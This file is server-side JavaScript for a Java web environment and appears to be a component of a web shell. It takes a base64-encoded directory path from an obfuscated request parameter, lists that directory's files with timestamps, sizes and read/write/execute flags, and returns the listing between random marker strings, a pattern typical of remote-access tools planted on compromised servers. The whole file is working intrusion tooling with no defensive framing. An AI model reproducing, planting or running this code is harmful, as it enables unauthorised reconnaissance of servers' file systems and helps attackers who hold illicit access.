try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var output = new StringBuffer("");
var cs = "UTF-8";
var tag_s = "1bfdb1b";
var tag_e = "7b34867a";
try {
  response.setContentType("text/html");
  request.setCharacterEncoding(cs);
  response.setCharacterEncoding(cs);
  function decode(str) {
    str = str.substr(2);
    return byte2Str(Base64DecodeToByte(str));
  }
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = new Base64().getDecoder().decode(str);
    }
    return bt;
  }
  function byte2Str(bt) {
    var result = "";
    for (var i = 0; i < bt.length; i++) {
      result += String.fromCharCode(bt[i]);
    }
    return result;
  }
  function asoutput(str) {
    return str;
  }
  function FileTreeCode(dirPath) {
    var oF = new File(dirPath);
    var l = oF.listFiles();
    var s = "",
      sT,
      sQ,
      sF = "";
    var dt;
    var fm = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    for (var i = 0; i < l.length; i++) {
      dt = new java.util.Date(l[i].lastModified());
      sT = fm.format(dt);
      sQ = l[i].canRead() ? "R" : "-";
      sQ += l[i].canWrite() ? "W" : "-";
      try {
        sQ += l[i].getClass().getMethod("canExecute").invoke(l[i]) ? "X" : "-";
      } catch (e) {
        sQ += "-";
      }
      var nm = l[i].getName();
      if (l[i].isDirectory()) {
        s += nm + "/	" + sT + "	" + l[i].length() + "	" + sQ + "\n";
      } else {
        sF += nm + "	" + sT + "	" + l[i].length() + "	" + sQ + "\n";
      }
    }
    s += sF;
    return s;
  }
  var dirPath = decode(request.getParameter("vd80b42be6ae07"));
  output.append(FileTreeCode(dirPath));
} catch (e) {
  output.append("ERROR:// " + e.toString());
}
try {
  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e);
} catch (e) {}
